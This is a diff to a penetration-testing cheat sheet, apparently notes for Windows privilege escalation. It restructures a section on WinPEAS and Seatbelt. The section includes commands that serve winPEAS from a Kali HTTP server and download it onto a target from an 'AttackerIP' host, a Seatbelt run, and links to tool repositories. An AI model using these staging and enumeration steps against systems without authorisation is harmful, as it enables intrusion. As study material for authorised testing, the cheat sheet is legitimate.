@@ -99,21 +99,30 @@ Get-History
 (Get-PSReadlineOption).HistorySavePath
 ```
 
-### WinPeas (Seatbelt, JAWS)
+### Automatic tools
 
-```
-cd /usr/share/peass/winpeas/winPEASx64.exe
-python3 -m http.server 8088
-iwr -uri http://AttackerIP/winPEASx64.exe -Outfile winPEAS.exe
+#### WinPEAS
 
-seatbelt.exe -group=all
+Upload on the target:
 ```
-Tools:
+kali$ cd /usr/share/peass/winpeas/
+kali$ python3 -m http.server 8088
+PS> iwr -uri http://AttackerIP/winPEASx64.exe -Outfile winPEAS.exe
+```
+
+#### Other tools
+
+URLs:
 - https://github.com/carlospolop/PEASS-ng
 - https://github.com/GhostPack/Seatbelt
 - https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
 - https://github.com/Marshall-Hallenbeck/compiled_binaries
 - https://github.com/411Hall/JAWS
+
+Seatbelt usage:
+```
+seatbelt.exe -group=all
+```
 
 ## Services
 
